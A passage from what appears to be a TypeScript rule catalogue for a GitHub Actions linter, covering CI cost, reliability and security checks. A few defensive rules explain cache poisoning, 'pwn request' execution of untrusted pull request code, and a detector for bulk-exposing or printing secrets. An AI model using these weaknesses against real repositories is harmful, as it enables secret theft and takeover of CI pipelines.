        "rationale": "The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/secrets-bulk-expose",
      "metadataSha256": "daa3d29ffdea7f151b7623d9ca98c10b05d92a5c929f83a6ba3287d7448f205b",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` or print secrets with `echo`/`printf`."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "`toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "security/untrusted-checkout",
      "metadataSha256": "020244a79c6b3391e3eb938c6facbffbffef1cc1c7ce0752122fbea1f41bf774",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "`pull_request_target` and `workflow_run` workflows must not check out the pull request's code and then execute it."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a \"pwn request\"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/cache-disabled-install",
      "metadataSha256": "455697c64aae315edad8041903a69661f4556c50d2ab7e9db3744d088843fdc7",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/fixed-sleep",
      "metadataSha256": "c4e070b224f2389e6104cdfe640edbda7729cbae10bbcc65fa5d47d97a2bbd2c",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Run steps should wait for services to become ready instead of sleeping for a fixed time."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/masked-failures",
      "metadataSha256": "5dc155a5f9d7207da3437e29d37f7a468c0d751b5a8e3779f05cca35f1e81d22",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Test failures should fail the job, not be silenced by `continue-on-error: true` or `|| true`."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/playwright-browser-cache",
      "metadataSha256": "2ed44dc656f0b1e1fd2900bbd68927d52450ca0d5c50f36e8837b54714f8bff8",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Jobs that download Playwright browsers should cache them or run in the Playwright container image."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "`playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/tool-incremental-cache",
      "metadataSha256": "a0d31dfda1c42e83210b0cb298a73f642d4b3f2a550ac2d791f4c277e0bbfd55",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "ESLint, tsc and Jest should keep their incremental caches between CI runs."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/unconditional-debug-upload",
      "metadataSha256": "6ae87cf87c4cc5ef3be96827d4d8726a2e8a6a69bae0922a586bfd630034a193",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "testing/watch-mode-in-ci",
      "metadataSha256": "9327fbe1fbbbd7c3159758af9a533e55087f1b13541a0f8171340c72d78ab9b8",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Test runners and compilers in CI should run once instead of in watch mode."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/draft-pr-gating",
      "metadataSha256": "4bfc94a80d06096adeb127df2b10d3e76e3535ddbbf96331252929c2bd506bcd",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Skip expensive pull request jobs while the pull request is still a draft."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/frequent-schedule",
      "metadataSha256": "10b23fc914d906a23c305e87b7ae85dff80232c3efc17a57ad38acf9dfadeaa3",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Avoid scheduled workflows that run more often than every 15 minutes."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/missing-job-condition-matrix",
      "metadataSha256": "8c746eff9771a9cdb441586364332bab57d3001ae9bff91d18e1be09cfea3523",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Gate matrix jobs on the workflow's existing change-detection job."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/noisy-pr-types",
      "metadataSha256": "00eb7e3610794928c5924c8bda6f139fc0e2ce266d9927baf12980b7532aa16d",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Do not re-run build and test workflows on pull request metadata events such as labels or edits."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/serialized-matrix",
      "metadataSha256": "b5d723734a709d1c85365117ffae98aaca1c8547b6144b668c354a1a0733a847",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Avoid throttling a matrix with a `max-parallel` far below its number of legs."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/shard-fail-fast",
      "metadataSha256": "e005d8949e84b82d1417300d6d2e82cbd21f0ea5495d8f0bb86979ead0e8c9b1",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Let sharded pull request test matrices stop early when one shard fails."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "triggers/workflow-run-chain",
      "metadataSha256": "dd39eb29cff4709c5a07fba8d9165128395d92fbc6f306fb73ddf50f520c1d9c",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "workflow/artifact-retention",
      "metadataSha256": "bf8ef49653bcab05950fdb34bf5e07cea531a8ab22c56e9ec32319fb4e0559be",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Uploaded artifacts should set a short `retention-days` instead of the repository default."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Artifacts are kept for the repository default (90 days unless changed) and count against Actions storage. Agent-driven repositories produce many runs per day, so build outputs that only feed later jobs pile up quickly; a short retention keeps storage and quota headroom without slowing anything down."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "workflow/concurrency",
      "metadataSha256": "a936c1f146e39da184e57ebaa76bbe9c79202bc21988104cfe8644d69d41d1b7",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Pull request workflows should cancel superseded runs; deploy workflows must not."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Agents push many small commits. Without a concurrency group every push keeps running to completion, wasting runner minutes and delaying feedback. Deploy and release workflows must never cancel in-progress runs."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "workflow/job-timeout",
      "metadataSha256": "a105cc8bd3a00211388e9472553955a48adce0201dd628d6353d587630200ebe",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Jobs should set `timeout-minutes` well below the 360 minute default."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "A hung job holds a runner (and every dependent job, merge queue entry, and agent loop) for up to six hours. A tight timeout turns hangs into fast, retryable failures."
      },
      "autofix": "not-formally-proved",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "workflow/merge-group",
      "metadataSha256": "fd1b482ad7230d79e30bfab8bd6a71e0c0d1b67e576e4d3d3e75dcb87b069cde",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "CI workflows that run on `pull_request` should also run on `merge_group`."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Agent-heavy repositories open and merge many pull requests at once, so a merge queue is the only practical way to keep the default branch green without serial rebases. A merge queue waits for the required checks to report on the `merge_group` event; a required-check workflow that only listens to `pull_request` never runs there, so queued pull requests stall until they time out."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    },
    {
      "id": "workflow/outdated-action-major",
      "metadataSha256": "1cfb75e0a84fb027af765331036973f46ece4537c460452c142d3c14bb08304f",
      "detector": {
        "assurance": "heuristic-not-formally-proved",
        "claim": "Well-known actions should use their current major version, and local JavaScript actions should run on node24."
      },
      "recommendation": {
        "assurance": "conditional-not-universally-proved",
        "rationale": "Old majors of the official setup, cache, checkout, and artifact actions miss performance work (faster caching backends, parallel artifact uploads) and, below the node24 releases, target Node 20, which GitHub Actions runners removed on 2026-09-23: they now force those actions onto Node 24, which their authors never tested, and warn on every run (self-hosted runners on unsupported platforms cannot run them at all). Agents copy existing workflow snippets, so one stale pin spreads quickly."
      },
      "autofix": "not-provided",
      "engineContracts": [
        "severity-last-assignment-wins"
      ],
      "optionalModelCertificates": []
    }
  ]
} as const;
